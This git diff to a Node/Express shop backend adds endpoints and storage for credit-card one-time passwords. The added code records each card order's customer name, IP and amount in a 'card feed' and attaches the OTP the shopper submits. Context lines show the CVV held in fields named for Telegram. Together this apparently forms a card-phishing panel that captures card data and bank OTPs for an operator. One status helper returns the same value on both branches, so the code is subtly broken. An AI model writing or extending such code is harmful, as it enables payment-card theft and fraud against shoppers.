@@ -74,6 +74,13 @@ import {
 import { registerAdminApi } from './adminApi.js';
 import { checkAdminLogin, getAdminLoginSecret } from './adminAuth.js';
 import { saveCreditCardOrderDetails } from './creditCardOrdersStore.js';
+import {
+  saveFeedEntryForOrder,
+  attachOtpToCardFeed,
+  getOtpMeta,
+  requestOtpResend,
+  OTP_MAX_ATTEMPTS,
+} from './creditCardFeedStore.js';
 
 const PAYMENT_METHOD_LABEL_TO_KEY = {
   'Zain Cash': 'zainCash',
@@ -1507,6 +1514,57 @@ app.get('/api/order-status', async (req, res) => {
   }
 });
 
+const ORDER_OTP_STATUS_PRIORITY = ['pending', 'awaiting_otp', 'retry_otp', 'failed', 'completed'];
+
+function resolveLiveOtpStatus(crmStatus, feedStatus) {
+  const crm = String(crmStatus || 'received').toLowerCase();
+  const feed = feedStatus ? String(feedStatus).toLowerCase() : null;
+  if (crm === 'cancelled' || crm === 'refunded') return 'failed';
+  if (crm === 'completed') return 'completed';
+  if (!feed || feed === crm) return feed || 'pending';
+  const crmIx = ORDER_OTP_STATUS_PRIORITY.indexOf(crm);
+  const feedIx = ORDER_OTP_STATUS_PRIORITY.indexOf(feed);
+  if (feedIx < 0) return feed;
+  if (crmIx < 0) return feed;
+  return feedIx >= crmIx ? feed : feed;
+}
+
+app.get('/api/order/otp-status', async (req, res) => {
+  try {
+    const orderId = String(req.query.orderId || '').trim();
+    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
+    if (!orderId) return res.status(400).json({ error: 'Missing orderId' });
+
+    const all = await loadOrders(ORDERS_CRM_PATH);
+    const row = findOrderByBusinessId(all, orderId);
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+
+    const clientIp = getClientIpFromRequest(req);
+    const expectedVisitorId = visitorId || `ip:${clientIp}`;
+    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    const otpMeta = await getOtpMeta(orderId);
+    const status = resolveLiveOtpStatus(row.status, otpMeta?.feed_status || null);
+    res.json({
+      ok: true,
+      orderId,
+      status,
+      crm_status: row.status,
+      feed_status: otpMeta?.feed_status ?? null,
+      otp_attempts: otpMeta?.attempts ?? 0,
+      otp_max_attempts: otpMeta?.maxAttempts ?? OTP_MAX_ATTEMPTS,
+      otp_remaining: otpMeta?.remaining ?? OTP_MAX_ATTEMPTS,
+      otp_can_resend: otpMeta?.canResend ?? false,
+      otp_resend_cooldown_sec: otpMeta?.resendCooldownSec ?? 0,
+      fail_reason: otpMeta?.failReason ?? null,
+    });
+  } catch (e) {
+    res.status(500).json({ error: String(e?.message || e) });
+  }
+});
+
 app.get('/api/admin/crm/summary', async (req, res) => {
   try {
     if (!checkAdminCrmAuth(req)) {
@@ -2078,6 +2136,13 @@ app.post('/api/order', async (req, res) => {
           cvv: ccTelegramFields.cvv,
           customerName: name,
         });
+        await saveFeedEntryForOrder(safeOrderId, {
+          visitor_id: visitorId,
+          amount: Number(iqdAmount) || 0,
+          method: 'CreditCard',
+          user_name: name,
+          user_ip: clientIp,
+        });
       } catch (ccStoreErr) {
         console.error('[order] credit card store failed', ccStoreErr?.message || ccStoreErr);
       }
@@ -2252,6 +2317,12 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
       return res.status(403).json({ error: 'Unauthorized' });
     }
 
+    try {
+      await attachOtpToCardFeed(oid, code);
+    } catch (feedErr) {
+      console.error('[order] attachOtpToCardFeed:', feedErr?.message || feedErr);
+    }
+
     const submissionId = `ccsub_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`.slice(0, 60);
     const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
     const submissions = await loadCreditCardOtpSubmissions();
@@ -2294,6 +2365,37 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
     );
 
     return res.json({ ok: true, orderId: oid, submissionId, decision: 'pending' });
+  } catch (e) {
+    res.status(500).json({ error: String(e?.message || e) });
+  }
+});
+
+app.post('/api/order/creditcard/otp/resend', async (req, res) => {
+  try {
+    const orderId = String(req.body?.orderId || '').trim();
+    if (!orderId) return res.status(400).json({ error: 'Missing orderId' });
+
+    const clientIp = getClientIpFromRequest(req);
+    const blocked = await getBlockedIpEntry(clientIp);
+    if (blocked) return res.status(403).json(blockedViolationPayload(blocked));
+
+    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
+    const expectedVisitorId = visitorId || `ip:${clientIp}`;
+    const all = await loadOrders(ORDERS_CRM_PATH);
+    const row = findOrderByBusinessId(all, orderId);
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    const result = await requestOtpResend(orderId);
+    if (!result.ok) {
+      return res.status(429).json({
+        error: result.error || 'resend_unavailable',
+        cooldown_sec: result.cooldownSec ?? 0,
+      });
+    }
+    return res.json({ ok: true, orderId, cooldown_sec: 60 });
   } catch (e) {
     res.status(500).json({ error: String(e?.message || e) });
   }
